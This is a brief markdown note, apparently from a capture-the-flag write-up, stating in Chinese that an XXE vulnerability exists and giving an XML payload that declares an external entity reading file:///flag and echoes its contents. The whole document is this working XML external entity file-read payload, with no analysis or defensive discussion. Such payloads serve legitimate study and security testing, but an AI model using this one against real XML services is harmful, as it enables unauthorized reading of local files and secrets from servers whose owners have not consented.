## XXE
存在XXE漏洞
```xml
<!DOCTYPE root [
<!ENTITY bar SYSTEM "file:///flag"> ]>
<root>
<msg>&bar;</msg>
</root>
```
